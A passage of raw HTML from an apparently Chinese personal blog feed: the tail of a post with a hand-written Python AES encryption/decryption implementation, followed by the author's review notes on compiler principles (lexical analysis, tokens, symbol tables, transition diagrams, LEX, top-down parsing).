class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">16</span>):<br>        x, y = i % <span class="hljs-number">4</span>, i // <span class="hljs-number">4</span> <br>        result = <span class="hljs-number">0</span><br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">4</span>):<br>            result ^= (mul(matrix[x * <span class="hljs-number">4</span> + j], <span class="hljs-built_in">int</span>(m_row[y * <span class="hljs-number">4</span> + j], <span class="hljs-number">16</span>)))<br>        result = mod(result)<br>        m_col.append(<span class="hljs-built_in">hex</span>(result))<br>    <span class="hljs-keyword">return</span> m_col<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">aes_encrypt</span>(<span class="hljs-params">m, key_rotate</span>):<br>    m_hex = get_hex(m) <span class="hljs-comment">#得到明文的hex列表</span><br>    m_xor = xor(m_hex, key_rotate[<span class="hljs-number">0</span>]) <span class="hljs-comment">#将明文初始xor密钥 w0 w1 w2 w3</span><br>    <span class="hljs-keyword">for</span> rotate <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">11</span>): <span class="hljs-comment">#十轮</span><br>        m_s = substitute(m_xor) <span class="hljs-comment"># 字节代替</span><br>        m_row = shiftrows(m_s)<br>        m_col = m_row <span class="hljs-comment">#列混合</span><br>        <span class="hljs-keyword">if</span> rotate != <span class="hljs-number">10</span>: <span class="hljs-comment">#最后一轮不用列混合</span><br>            m_col = mixcolumn(m_row)<br>        m_xor = xor(m_col, key_rotate[rotate])<br>    ciphertext = <span class="hljs-string">&quot;&quot;</span> <span class="hljs-comment">#输出的密文为每个十六进制字符的联结，类似e365e09962d634a8fbfe8359c57b22c5。一共32个，每两个字母对应了一个字节的十六进制。16个进制，128位。</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> m_xor:<br>        ciphertext += (i[<span class="hljs-number">2</span>:] <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(i[<span class="hljs-number">2</span>:]) == <span class="hljs-number">2</span> <span class="hljs-keyword">else</span> <span class="hljs-string">&quot;0&quot;</span> + i[<span class="hljs-number">2</span>:]) <span class="hljs-comment">#对类似0xf的十六进制格式化为0x0f</span><br>    <span class="hljs-keyword">return</span> ciphertext<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">aes_decrypt</span>(<span class="hljs-params">c, key_rotate</span>):<br>    c_hex = [<span class="hljs-string">&#x27;0x&#x27;</span> + c[i * <span class="hljs-number">2</span>] + c[i * <span class="hljs-number">2</span> + <span class="hljs-number">1</span>] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">16</span>)] <span class="hljs-comment">#将密文恢复为列表</span><br>    c_xor = xor(c_hex, key_rotate[<span class="hljs-number">10</span>])<br>    c_row = shiftrows(c_xor, inverse=<span class="hljs-literal">True</span>)<br>    c_s = substitute(c_row, inverse=<span class="hljs-literal">True</span>)<br>    <span class="hljs-keyword">for</span> rotate <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>, <span class="hljs-number">0</span>, -<span class="hljs-number">1</span>): <span class="hljs-comment">#循环9次</span><br>        c_xor = xor(c_s, key_rotate[rotate])<br>        c_col = mixcolumn(c_xor, inverse=<span class="hljs-literal">True</span>)<br>        c_row = shiftrows(c_col, inverse=<span class="hljs-literal">True</span>)<br>        c_s = substitute(c_row, inverse=<span class="hljs-literal">True</span>)<br>    plaintext = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xor(c_s, key_rotate[<span class="hljs-number">0</span>]): <span class="hljs-comment">#将明文的hex列表转化为字母</span><br>        plaintext += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(i, <span class="hljs-number">16</span>))<br>    <span class="hljs-keyword">return</span> plaintext<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    plaintext, key =  <span class="hljs-string">&quot;wuuconixwuuconix&quot;</span>, <span class="hljs-string">&quot;yydsyydsyydsyyds&quot;</span><br>    key_rotate = gen_key(key)<br>    ciphertext = aes_encrypt(plaintext, key_rotate) <span class="hljs-comment"># e365e09962d634a8fbfe8359c57b22c5</span><br>    <span class="hljs-built_in">print</span>(aes_decrypt(ciphertext, key_rotate))<br></code></pre></td></tr></table></figure><p><img src="https://upyun.wuuconix.link/image-20211008214802059.png" alt="AES" /></p><p><img src="https://upyun.wuuconix.link/image-20211008214858747.png" alt="在线加密" /></p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    
    
    <tags>
      
      <tag>python</tag>
      
      <tag>crypto</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>编译原理复习笔记</title>
    <link href="/2021/10/05/complier/"/>
    <url>/2021/10/05/complier/</url>
    
    <content type="html"><![CDATA[<header><meta name="referrer" content="never"></header>    <div id="aplayer-QUAHJdkM" class="aplayer aplayer-tag-marker meting-tag-marker"         data-id="592473" data-server="netease" data-type="song" data-mode="circulation" data-autoplay="false" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#555"    ></div><h2 id="背景"><a class="markdownIt-Anchor" href="#背景"></a> 背景</h2><p>这门课学着十分痛苦，因为我认为学习如何编译没有什么作用。而且下一届网安同学这门课就变成考查课了，这让我愤愤不平。然而生活还是要继续，做做笔记吧——</p><h2 id="计算机语言的发展"><a class="markdownIt-Anchor" href="#计算机语言的发展"></a> 计算机语言的发展</h2><ol><li>机器语言 Machine Language 与汇编语言 Assemble Language</li><li>高级语言 High Level Language</li><li>命令语言 Command Language</li></ol><p>目前我熟悉高级语言与命令语言，Linux的命令的简介与高效让我印象深刻。</p><p>汇编语言则是只是粗略得看了几个指令，没有实际使用过。感觉能熟练使用汇编得时候，就是已经对计算机组成十分熟悉了。</p><h2 id="翻译系统"><a class="markdownIt-Anchor" href="#翻译系统"></a> 翻译系统</h2><ol><li><p>翻译程序 Translator 将某一种语言描述的程序 Source Program 等价地翻译成另一种语言描述 Object Program 的程序。</p><p>我没有见过具体的翻译程序。感觉IDA PRO里把汇编翻译成C貌似有点接近？</p></li><li><p>解释程序 Interpreter</p><p>这和翻译程序的差别类似于 口译和笔译，解释程序是对源程序是一句一句解释的，而翻译程序是一次性翻译好。</p></li><li><p>编译程序 Compiler</p><p>编译程序和翻译程序应该类似。只不过编译程序的源程序是高级程序语言，而目标语言是汇编或者机器语言程序。</p></li></ol><p>编译系统是什么呢？</p><p>实际上就是编译程序加上运行系统。首先将源程序通过编译程序编译成为目标语言，然后这个目标语言在运行系统上运行，接受输入后运算后输出。</p><h2 id="编译系统的功能分析"><a class="markdownIt-Anchor" href="#编译系统的功能分析"></a> 编译系统的功能分析</h2><ol><li><p>程序分析</p><p>需要分析 词法 语法 和语义</p></li><li><p>分析综合</p><p>语句的翻译、代码生成</p></li><li><p>标识符处理：左值和右值的绑定</p><p>变量：存储单元</p><p>函数：目标代码序列</p></li></ol><h2 id="编译程序总体结构"><a class="markdownIt-Anchor" href="#编译程序总体结构"></a> 编译程序总体结构</h2><ol><li><p>词法分析</p><p>词法分析由词法分析器<code>Lexical Analyzer</code> 又叫做扫描器<code>Scanner</code></p><p>输入：字符串</p><p>输出：（种别码，属性值）——序对</p><p>​属性值——token的机内表示</p></li><li><p>语法分析由语法分析器 <code>Syntax Analyzer</code> 又叫所 <code>Parser</code></p><p>输入：token序列</p><p>输出：语法成分</p></li><li><p>语义分析</p><p>分析由语法分析器识别出的语法单位的语义</p></li><li><p>中间代码生成</p><p>中间代码的特点：简单规范 与机器无关 易于优化与转换</p></li><li><p>代码优化</p><p>对中甲代码进行优化处理；对代码进行等价变化以提高执行效率</p><p>之前做用C<ins>来做实验的时候，g</ins> -o2 貌似就能指定优化效率。现在看来就是g++编译器把中间代码就行优化的过程。</p><p>优化分为和机器无关的优化和与机器有关的优化</p><p>无关主要指的是代码层面比如常数运算在编译期就完成，将循环不变的计算移出循环等等。</p><p>而有关优化是会影响到机器的，比如将常用量放入寄存器，根据算法访存的要求安排Cache等等。</p></li><li><p>目标代码生成</p><p>目标代码的形式<code>具有绝对地址的机器指令</code> <code>汇编语言形式的目标程序</code> <code>模块结果的机器指令</code></p></li><li><p>表格管理</p><p>管理各种符号表（常数、标号、变量、过程、结构），查、填源程序中出现的符号和编译程序生成的符号，为编译的各个阶段提供信息。</p></li><li><p>错误处理</p><p>进行各种错误的检查、报告、纠正，以及相应的续编译处理</p></li></ol><p>模块分类</p><ol><li><p>分析：词法分析 语法分析 语义分析 中间代码生成</p></li><li><p>综合： 代码优化 目标代码生成</p></li><li><p>辅助：符号表管理 出错管理</p><p>这8项功能分别对应8个模块</p></li></ol><p>编译的前端和后端</p><ol><li><p>前端</p><p>与源语言有关、与目标机无关的部分</p><p>词法分析 语法分析 语义分析 中间代码生成 与机器无关的代码优化</p></li><li><p>后端</p><p>与目标机有关的部分</p><p>与机器有关的代码优化 目标代码生成</p></li></ol><h2 id="编译程序的生成"><a class="markdownIt-Anchor" href="#编译程序的生成"></a> 编译程序的生成</h2><ol><li><p>编译程序的自展技术</p><p>直接实现一个C语言 编译器太复杂。先用汇编语言实现一个C语言子集的编译程序。那么我们就可以汇编语言处理这个编译程序了。然后我们用这个子集来编制C语言的编译程序。便实现了编译。</p></li><li><p>利用编译 程序自动生成器</p></li></ol><h2 id="词法分析器的功能"><a class="markdownIt-Anchor" href="#词法分析器的功能"></a> 词法分析器的功能</h2><p>词法分析器叫做<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>S</mi><mi>c</mi><mi>a</mi><mi>n</mi><mi>n</mi><mi>e</mi><mi>r</mi></mrow><annotation encoding="application/x-tex">Scanner</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mord mathdefault">c</span><span class="mord mathdefault">a</span><span class="mord mathdefault">n</span><span class="mord mathdefault">n</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span></span></span></span>，直接翻译的话就是扫描器，实际上这和它实际干的活也十分匹配。词法分析器干的活就是去分析源代码，然后输出单词符号<code>token</code>。</p><p>这个所谓的<code>token</code>实际上通常就是一个二元组(单词种类，属性值)</p><p>所以词法分析器的关键就是找到符号的分隔符，从而将各个符号写成一个个token，最后我们扫描完了，也就获得了一个token序列。这便是词法分析器的输出了。</p><h3 id="单词符号的表示"><a class="markdownIt-Anchor" href="#单词符号的表示"></a> 单词符号的表示</h3><p>单词符号，也就是<code>token</code>可以分类以下5类。</p><ol><li><p>关键字，也称保留字</p><p>这个比较好理解，比如c中的<code>return</code>、<code>int</code>都是保留字。我们不能这这些关键字来定义变量名。</p></li><li><p>标识符</p><p>这实际上就是我们定义的一些变量名，函数名之类的。是一些用来表示名字的合法串。</p></li><li><p>常数</p><p>比如整形，实型，布尔型，字符型等。</p></li><li><p>运算符</p><p>有算数运算符、逻辑运算符、关系运算符等</p></li><li><p>界限符</p><p>这个可能比较陌生，比如<code>, ; () :=</code>，用于运算也用于分隔对象。</p><p>比如python中逗号的使用实例</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">a, b = <span class="hljs-number">1</span>, <span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><p>至于这个例子中的<code>:=</code>是什么意思，我挺好奇的，课上看到的时候也有些困惑。</p></li></ol><p>单词符号的机内表示之前说过，是一个二元组。内容为<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">(</mo><mi mathvariant="normal">单</mi><mi mathvariant="normal">词</mi><mi mathvariant="normal">种</mi><mi mathvariant="normal">别</mi><mi mathvariant="normal">码</mi><mo separator="true">,</mo><mi mathvariant="normal">单</mi><mi mathvariant="normal">词</mi><mi mathvariant="normal">自</mi><mi mathvariant="normal">身</mi><mi mathvariant="normal">值</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(单词种别码, 单词自身值)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord cjk_fallback">单</span><span class="mord cjk_fallback">词</span><span class="mord cjk_fallback">种</span><span class="mord cjk_fallback">别</span><span class="mord cjk_fallback">码</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord cjk_fallback">单</span><span class="mord cjk_fallback">词</span><span class="mord cjk_fallback">自</span><span class="mord cjk_fallback">身</span><span class="mord cjk_fallback">值</span><span class="mclose">)</span></span></span></span>。</p><p>以下为种别码的确定规则：</p><ol><li><p>关键字：一种一码</p><p>不知道关键字是怎么分&quot;种&quot;的</p></li><li><p>标识符：一种码。</p><p>这说明所有的标识符的种别码都是一个，可能就叫<code>id</code>？</p></li><li><p>常数： 一类型一码</p><p>这里我们可以看到，不同种类的常数将有不同的种别码。</p></li><li><p>界限符：一符一码</p><p>这里可以看到没个界限符都有一个独一无二的种别码，十分牛皮</p></li></ol><p>那单词符号种的属性值是怎么样的呢？</p><p>我们发现有一些符号是没有自身值得，比如关键字、界限符、运算符。</p><p>而有些是有值得，比如常数或者标识符。常数本身就是属性值。而标识符的属性值要写什么呢？我们需要写符号表中的入口地址。</p><h3 id="符号表的作用"><a class="markdownIt-Anchor" href="#符号表的作用"></a> 符号表的作用</h3><p>符号表这个表格是由编译程序简历的，用于存储程序在编译或者运行中所使用的变量或常量等信息。</p><p>并且这个符号表贯穿于整个编译过程，包括词法分析阶段、语法分析阶段、语义分析阶段及中间代码生成阶段、数据存储分配、代码优化阶段、目标代码生成阶段。</p><p>符号表首先是在词法分析阶段建立的。 词法分析阶段将不重复的标识符、数字和字符常量的性质填入符号表中，不日名字、类型、数值等。并将变量在符号表中的入口地址写道其本身的TOKEN字中。</p><p>符号表中包括名字 NAME, 类型 TYPE, 种属 KIND, 数值 VAL, 作用域和地址 ADDR, 还带有一个字符串表。</p><p>名字栏中包含两个子栏，分别存放标识符在字符串表中的起始位置和长度。类型栏表示该标识符的类型(整型，实型，布尔还是字符)，种属栏表示该标识符属于哪一类的名字（简单变量、常数名、数组名、过程名）；数值栏存放常数标识符的值，地址栏存放分配给符号的地址。</p><p>感觉这个符号表填的东西还挺多的。</p><h3 id="词法单元的识别"><a class="markdownIt-Anchor" href="#词法单元的识别"></a> 词法单元的识别</h3><p>词法分析器要求能够检查输入字符串，在前缀中找出和某个模式匹配的词素。</p><p>通过正则定义来描述各个词法单元的描述。</p><p>编译原理的正则就是我们常见的正则，和形式语言里古板的，没有生气的正则不同，在这里，我们可使用以许多已经习以为常的拓展</p><ol><li>r+ 等价于rr*</li><li>r? 等价于 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>ϵ</mi><mi mathvariant="normal">∣</mi><mi>r</mi></mrow><annotation encoding="application/x-tex">\epsilon | r</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">ϵ</span><span class="mord">∣</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span></span></span></span></li><li><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">[</mo><msub><mi>a</mi><mn>1</mn></msub><msub><mi>a</mi><mn>2</mn></msub><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><msub><mi>a</mi><mi>n</mi></msub><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[a_1a_2..a_n]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">.</span><span class="mord">.</span><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">]</span></span></span></span>等价于<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>a</mi><mn>1</mn></msub><mi mathvariant="normal">∣</mi><msub><mi>a</mi><mn>2</mn></msub><mi mathvariant="normal">∣</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">∣</mi><msub><mi>a</mi><mi>n</mi></msub></mrow><annotation encoding="application/x-tex">a_1|a_2|..|a_n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">∣</span><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">∣</span><span class="mord">.</span><span class="mord">.</span><span class="mord">∣</span><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></li><li><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">[</mo><mi>a</mi><mo>−</mo><mi>e</mi><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[a-e]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord mathdefault">a</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">e</span><span class="mclose">]</span></span></span></span>等价于<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>a</mi><mi mathvariant="normal">∣</mi><mi>b</mi><mi mathvariant="normal">∣</mi><mi>c</mi><mi mathvariant="normal">∣</mi><mi>d</mi><mi mathvariant="normal">∣</mi><mi>e</mi></mrow><annotation encoding="application/x-tex">a|b|c|d|e</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">a</span><span class="mord">∣</span><span class="mord mathdefault">b</span><span class="mord">∣</span><span class="mord mathdefault">c</span><span class="mord">∣</span><span class="mord mathdefault">d</span><span class="mord">∣</span><span class="mord mathdefault">e</span></span></span></span></li></ol><p>这才是正则嘛！</p><h3 id="状态转化图"><a class="markdownIt-Anchor" href="#状态转化图"></a> 状态转化图</h3><p>状态转化图 <code>transition diagram</code>是词法分析器的重要组件之一。</p><ol><li>状态(State)<ul><li>状态可以看作是已处理部分的总结</li><li>某些状态为接受状态或总结状态，表名已经找到了词素</li><li>加上*的接受状态表示最后读入的符号不在词素中</li><li>开始符号用 start边表示。</li></ul></li><li>边(edge) 从一个状态转向另一个状态。</li></ol><p>当状态到达接受状态表名我们识别到了某个标识符。</p><h2 id="词法分析器的设计与实现"><a class="markdownIt-Anchor" href="#词法分析器的设计与实现"></a> 词法分析器的设计与实现</h2><p>我们可以用转化图来构造词法分析器。所以我们需要将状态转化图的一些功能用代码实现。</p><ol><li>变量State记录当前状态</li><li>一个Switch根据State的值换到相应代码</li><li>每个状态对应一段代码<ul><li>这段代码根据读入的符号确定下一个状态</li><li>如果找不到相应的边，则调用fail()进行错误恢复</li></ul></li><li>进入某个接受状态时，返回相应的词法单元<ul><li>注意状态有*标记时，（即终结符号）需要回退forward指针。</li></ul></li></ol><h3 id="处理多个模式的方法"><a class="markdownIt-Anchor" href="#处理多个模式的方法"></a> 处理多个模式的方法</h3><p>以上只考虑了一个模式，那实际上词法分析肯定时有多种模式供识别的，那怎么办呢？</p><p>有以下3种可能的方法。</p><ol><li>顺序地尝试各个词法单元对用地状态转化图。如果引发fail()，回退并启动下一个状态图。可以根据优先级确定尝试顺序。</li><li>“并行”地运行各个状态转化图。通过贪心策略，识别最长地和某个模式匹配地输入前缀。</li><li>预先把各个状态转化图合成一个状态转化图，然后运行这个状态转换图。</li></ol><h2 id="lex介绍"><a class="markdownIt-Anchor" href="#lex介绍"></a> LEX介绍</h2><ol><li>LEX源程序-&gt;LEX编译器-&gt;Lex.yy.c</li><li>Lex.yy.c-&gt;C编译器-&gt;词法分析器L</li><li>输入流-&gt;词法分析器L-&gt;Token序列</li></ol><h2 id="第三章总结"><a class="markdownIt-Anchor" href="#第三章总结"></a> 第三章总结</h2><ol><li><p>词法从组成源程序地字符行中寻找出单词，并给出它们地种别和属性——输出二元组序列</p></li><li><p>高级语言地单词组成一个3型语言</p><blockquote><p>0型文法：短语结构语法 Phrase Structure Grammars</p><p>1型文法：上下文有关语法 Context-Sensitice Grammars</p><p>2型文法：上下文无关文法 Context-Free Grammars</p><p>3型文法：正规文法 Regular Grammars。也许翻译成正则文法更好。</p><p>3型文法产生的语言就就叫做3型语言。</p></blockquote></li><li><p>3型语言可以用RE、RG、FA描述。</p><blockquote><p>RE 应该是Regular Expression</p><p>RG 应该是Regular Grammar</p><p>FA 应该是Finite Automata</p></blockquote></li><li><p>FA的状态转移图，可以被用来指导相应的语法分析器的实现</p></li><li><p>3型语言相应的理论指导人们构造出了高级语言的词法分析器的自动生成器，如Lex</p></li></ol><h2 id="语法分析的功能"><a class="markdownIt-Anchor" href="#语法分析的功能"></a> 语法分析的功能</h2><p>ok，我们已经完成了词法分析。接下来就是语法分析啦！</p><p>语法分析需要实现什么功能呢？</p><p>我们指导，词法分析已经将源代码转化为了单词符号序列。所以语法分析器就需要判断该Token序列是否符合该语言的文法，即是否构成一个合法的“句子”。</p><p>即语法分析器的输入：Token序列</p><p>语法分析器的输出：</p><ul><li>分析树</li><li>出错处理：定位、续编译</li></ul><p>我们可以运用的分析方法有：</p><ol><li><p>自顶向下（递归下降、预测分析）</p></li><li><p>自底向下（算符优先、LR分析器）</p><blockquote><p>目前还看不懂（</p></blockquote></li></ol><h2 id="自顶向下分析面临的问题与cfg的改造"><a class="markdownIt-Anchor" href="#自顶向下分析面临的问题与cfg的改造"></a> 自顶向下分析面临的问题与CFG的改造</h2><h3 id="自顶向下的分析"><a class="markdownIt-Anchor" href="#自顶向下的分析"></a> 自顶向下的分析</h3><p>什么是自顶向下的分析呢？是从文法的开始符号出发，寻求所给的输入符号串的一个最左推导。</p><p>比如从树根S出发，构造所给输入符号串的语法树</p><p>例，G为$S\rightarrow xAy\ \ A\rightarrow**|* <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi mathvariant="normal">，</mi><mi mathvariant="normal">输</mi><mi mathvariant="normal">入</mi><mi mathvariant="normal">串</mi><mi mathvariant="normal">：</mi></mrow><annotation encoding="application/x-tex">，输入串：</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0em;vertical-align:0em;"></span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">输</span><span class="mord cjk_fallback">入</span><span class="mord cjk_fallback">串</span><span class="mord cjk_fallback">：</span></span></span></span>x**y$</p><p>它的语法分析树是怎么样的呢？远程连接不好截图，这里描述一下，首先根据第一个推导式，就是根节点S分出三个节点<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>x</mi><mo separator="true">,</mo><mi>A</mi><mo separator="true">,</mo><mi>y</mi></mrow><annotation encoding="application/x-tex">x,A,y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">A</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span></span></span></span>。然后A节点再分出两个节点<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo>∗</mo></mrow><annotation encoding="application/x-tex">*</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.46528em;vertical-align:0em;"></span><span class="mord">∗</span></span></span></span>和<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo>∗</mo><mo>∗</mo></mrow><annotation encoding="application/x-tex">**</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.46528em;vertical-align:0em;"></span><span class="mord">∗</span><span class="mord">∗</span></span></span></span>。</p><h3 id="存在的问题"><a class="markdownIt-Anchor" href="#存在的问题"></a> 存在的问题</h3><p>这个自顶向下的语法分析技术存在一些问题。</p><ol><li><p>回溯</p><p>为什么会有回溯呢？</p><p>文法中每个非终结符A的产生式右部称为A的候选式，如果有多个候选式左端第一个符号相同，则语法分析程序无法根据当前输入符号选择产生式，只能试探。试探的过程中发现匹配不上，就会产生回溯。</p><p>就拿我们之间的G为例子。G中有个非终结符A，它的产生式有两个值，分别为<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo>∗</mo></mrow><annotation encoding="application/x-tex">*</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.46528em;vertical-align:0em;"></span><span class="mord">∗</span></span></span></span>和<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo>∗</mo><mo>∗</mo></mrow><annotation encoding="application/x-tex">**</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.46528em;vertical-align:0em;"></span><span class="mord">∗</span><span class="mord">∗</span></span></span></span>。如果我们的语法分析器第一次将A尝试为<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo>∗</mo></mrow><annotation encoding="application/x-tex">*</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.46528em;vertical-align:0em;"></span><span class="mord">∗</span></span></span></span>，结果为<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>A</mi><mo>∗</mo><mi>B</mi></mrow><annotation encoding="application/x-tex">A*B</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault">A</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.05017em;">B</span></span></span></span>，发现和输入不符合，则需要进行回溯。</p></li><li><p>左递归问题</p><p>左递归大概就是可以无穷递归，然后陷入一个循环。</p><p>比如<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>S</mi><mo>→</mo><mi>S</mi><mi>a</mi><mi>y</mi><mi mathvariant="normal">∣</mi><mo>∗</mo></mrow><annotation encoding="application/x-tex">S\rightarrow Say|*</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mord 